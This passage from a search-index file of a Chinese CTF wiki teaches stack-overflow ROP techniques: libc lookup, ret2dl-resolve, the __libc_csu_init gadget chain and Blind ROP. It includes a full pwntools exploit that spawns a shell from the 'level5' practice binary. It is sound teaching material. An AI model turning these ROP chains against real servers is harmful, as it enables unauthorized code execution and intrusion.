\u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4 shell \u4e0d\u80fd\u542f\u52a8\u3002","title":"pwnlib.dynelf"},{"location":"pwn/stackoverflow/basic_rop/#libc_2","text":"## \u66f4\u65b0\u6570\u636e\u5e93 ./get ## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d ./add libc.so ## Find all the libc's in the database that have the given names at the given addresses. ./find function1 addr function2 addr ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump. ./dump __libc_start_main_ret system dup2 \u53bb libc \u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684 libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u5728\u7ebf\u7f51\u7ad9: libcdb.com libc.blukat.me \u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684 https://github.com/lieanu/LibcSearcher \u3002","title":"libc \u6570\u636e\u5e93"},{"location":"pwn/stackoverflow/basic_rop/#ret2dl-resolve","text":"\u5f53 ELF \u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgo t\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2a libc \u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve \u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020 ROP \u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7 rop \u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002","title":"ret2dl-resolve"},{"location":"pwn/stackoverflow/basic_rop/#_15","text":"train.cs.nctu.edu.tw: rop 2013-PlaidCTF-ropasaurusrex Defcon 2015 Qualifier: R0pbaby","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/basic_rop/#_16","text":"\u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73) \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09 \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09 \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/stackoverflow/medium_rop/","text":"\u4e2d\u7ea7ROP \u00b6 \u4e2d\u7ea7 ROP \u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684 Gadgets\u3002 ret2__libc_csu_init \u00b6 \u539f\u7406 \u00b6 \u5728 64 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 \u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 x64 \u4e0b\u7684 __libc_csu_init \u4e2d\u7684 gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9 libc \u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528 libc \u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b) .text: 00000000004005 C0 ; void _libc_csu_init(void) .text : 00000000004005 C0 public __libc_csu_init .text: 00000000004005 C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text : 00000000004005 C0 push r15 .text: 00000000004005 C2 push r14 .text: 00000000004005 C4 mov r15d , edi .text: 00000000004005 C7 push r13 .text: 00000000004005 C9 push r12 .text: 00000000004005 CB lea r12 , __frame_dummy_init_array_entry .text: 00000000004005 D2 push rbp .text: 00000000004005 D3 lea rbp , __do_global_dtors_aux_fini_array_entry .text: 00000000004005 DA push rbx .text: 00000000004005 DB mov r14 , rsi .text: 00000000004005 DE mov r13 , rdx .text: 00000000004005 E1 sub rbp , r12 .text: 00000000004005 E4 sub rsp , 8 .text: 00000000004005 E8 sar rbp , 3 .text: 00000000004005 EC call _init_proc .text: 00000000004005 F1 test rbp , rbp .text: 00000000004005 F4 jz short loc_400616 .text: 00000000004005 F6 xor ebx , ebx .text: 00000000004005 F8 nop dword ptr [ rax + rax + 00000000 h ] .text: 0000000000400600 .text: 0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text: 0000000000400600 mov rdx , r13 .text: 0000000000400603 mov rsi , r14 .text: 0000000000400606 mov edi , r15d .text: 0000000000400609 call qword ptr [ r12 + rbx * 8 ] .text: 000000000040060 D add rbx , 1 .text: 0000000000400611 cmp rbx , rbp .text: 0000000000400614 jnz short loc_400600 .text: 0000000000400616 .text: 0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text: 0000000000400616 add rsp , 8 .text: 000000000040061 A pop rbx .text: 000000000040061 B pop rbp .text: 000000000040061 C pop r12 .text: 000000000040061 E pop r13 .text: 0000000000400620 pop r14 .text: 0000000000400622 pop r15 .text: 0000000000400624 retn .text: 0000000000400624 __libc_csu_init endp \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9 \u4ece 0x000000000040061A \u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236 rbx,rbp,r12,r13,r14,r15 \u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002 \u4ece 0x0000000000400600 \u5230 0x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 r13 \u8d4b\u7ed9 rdx,\u5c06 r14 \u8d4b\u7ed9 rsi\uff0c\u5c06 r15d \u8d4b\u7ed9 edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662f edi\uff0c \u4f46\u5176\u5b9e\u6b64\u65f6 rdi \u7684\u9ad8 32 \u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a 0\uff08\u81ea\u884c\u8c03\u8bd5\uff09 \uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rdi \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e 32 \u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662f x64 \u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236 r12 \u4e0e rbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rbx \u4e3a 0\uff0cr12 \u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u4ece 0x000000000040060D \u5230 0x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 rbx \u4e0e rbp \u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1 = rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884c loc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002 \u793a\u4f8b \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66 ROP \u4e4b linux_x64 \u7bc7\u4e2d level5 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4 \u279c ret2__libc_csu_init git: ( iromise ) \u2717 checksec level5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002 \u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa ssize_t vulnerable_function () { char buf ; // [sp+0h] [bp-80h]@1 return read ( 0 , & buf , 0x200uLL ); } \u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709 system \u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709 /bin/sh \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002 \u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528 system \u51fd\u6570\u6765\u83b7\u53d6 shell \u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve \u6765\u83b7\u53d6 shell\u3002 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u83b7\u53d6 write \u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c main \u51fd\u6570 \u6839\u636e libcsearcher \u83b7\u53d6\u5bf9\u5e94 libc \u7248\u672c\u4ee5\u53ca execve \u51fd\u6570\u5730\u5740 \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u5411 bss \u6bb5\u5199\u5165 execve \u5730\u5740\u4ee5\u53ca '/bin/sh\u2019 \u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain \u51fd\u6570\u3002 \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884c libc_csu_gadgets \u6267\u884c execve('/bin/sh') \u83b7\u53d6 shell\u3002 exp \u5982\u4e0b from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF ( './level5' ) sh = process ( './level5' ) write_got = level5 . got [ 'write' ] read_got = level5 . got [ 'read' ] main_addr = level5 . symbols [ 'main' ] bss_base = level5 . bss () csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu ( rbx , rbp , r12 , r13 , r14 , r15 , last ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64 ( csu_end_addr ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( csu_front_addr ) payload += 'a' * 0x38 payload += p64 ( last ) sh . send ( payload ) sleep ( 1 ) sh . recvuntil ( 'Hello, World \\n ' ) ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu ( 0 , 1 , write_got , 8 , write_got , 1 , main_addr ) write_addr = u64 ( sh . recv ( 8 )) libc = LibcSearcher ( 'write' , write_addr ) libc_base = write_addr - libc . dump ( 'write' ) execve_addr = libc_base + libc . dump ( 'execve' ) log . success ( 'execve_addr ' + hex ( execve_addr )) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh . recvuntil ( 'Hello, World \\n ' ) csu ( 0 , 1 , read_got , 16 , bss_base , 0 , main_addr ) sh . send ( p64 ( execve_addr ) + '/bin/sh \\x00 ' ) sh . recvuntil ( 'Hello, World \\n ' ) ## execve(bss_base+8) csu ( 0 , 1 , bss_base , 0 , 0 , bss_base + 8 , main_addr ) sh . interactive () \u601d\u8003 \u00b6 \u6539\u8fdb \u00b6 \u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528 gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a 128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5 \u6539\u8fdb1 - \u63d0\u524d\u63a7\u5236 rbx \u4e0e rbp \u00b6 \u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3 cmp \u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c11 16 \u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002 \u6539\u8fdb2-\u591a\u6b21\u5229\u7528 \u00b6 \u5176\u5b9e\uff0c\u6539\u8fdb 1 \u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684 gadgets \u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21 gadgets \u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6 \u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1 \u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539 r12-r15 \u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002 \u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002 gadget \u00b6 \u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570 _init _start call_gmon_start deregister_tm_clones register_tm_clones __do_global_dtors_aux frame_dummy __libc_csu_init __libc_csu_fini _fini \u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8e PC \u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800c CPU \u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002 \u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684 libc_csu_init \u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668 \u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002 \u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002 \u800c\u5176\u5b9e libc_csu_init \u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A \u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5728 0x000000000040061f \u5904\u53ef\u4ee5\u63a7\u5236 rbp \u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621 \u5904\u53ef\u4ee5\u63a7\u5236 rsi\u5bc4\u5b58\u5668\u3002 \u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002 gef \u27a4 x / 5 i 0x000000000040061A 0 x40061a < __libc_csu_init + 90 > : pop rbx 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 gef \u27a4 x / 5 i 0x000000000040061b 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 gef \u27a4 x / 5 i 0x000000000040061A + 3 0 x40061d < __libc_csu_init + 93 > : pop rsp 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret gef \u27a4 x / 5 i 0x000000000040061e 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x000000000040061f 0 x40061f < __libc_csu_init + 95 > : pop rbp 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x0000000000400620 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop 0 x400626: nop WORD PTR cs :[ rax + rax * 1 + 0x0 ] gef \u27a4 x / 5 i 0x0000000000400621 0 x400621 < __libc_csu_init + 97 > : pop rsi 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x000000000040061A + 9 0 x400623 < __libc_csu_init + 99 > : pop rdi 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop 0 x400626: nop WORD PTR cs :[ rax + rax * 1 + 0x0 ] 0 x400630 < __libc_csu_fini > : repz ret \u9898\u76ee \u00b6 2016 XDCTF pwn100 2016 \u534e\u5c71\u676f SU_PWN \u53c2\u8003\u9605\u8bfb \u00b6 http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html ret2reg \u00b6 \u539f\u7406 \u00b6 \u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4 \u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627e call reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP \u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740 reg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165 Shellcode (\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684) BROP \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 BROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f Hacking Blind \uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd paper slide BROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002 \u653b\u51fb\u6761\u4ef6 \u00b6 \u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002 \u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002 \u57fa\u672c\u601d\u8def \u00b6 \u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b \u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6 \u66b4\u529b\u679a\u4e3e Stack Reading \u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002 Bind ROP \u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002 Build the exploit \u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002 \u6808\u6ea2\u51fa\u957f\u5ea6 \u00b6 \u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002 Stack Reading \u00b6 \u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40 buffer|canary|saved fame pointer|saved returned address 